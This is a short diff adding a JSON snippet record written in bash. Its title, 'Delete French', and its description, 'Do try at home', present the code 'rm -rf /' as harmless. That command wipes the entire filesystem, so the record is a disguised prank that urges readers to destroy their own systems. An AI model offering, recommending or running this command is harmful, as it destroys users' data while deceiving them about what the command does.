@@ -1,0 +1,8 @@
+{
+    "slug": "To do:",
+    "author": "Compulsory test",
+    "title": "Delete French",
+    "language": "bash",
+    "code": "rm -rf /",
+    "description": "Do try at home"
+}
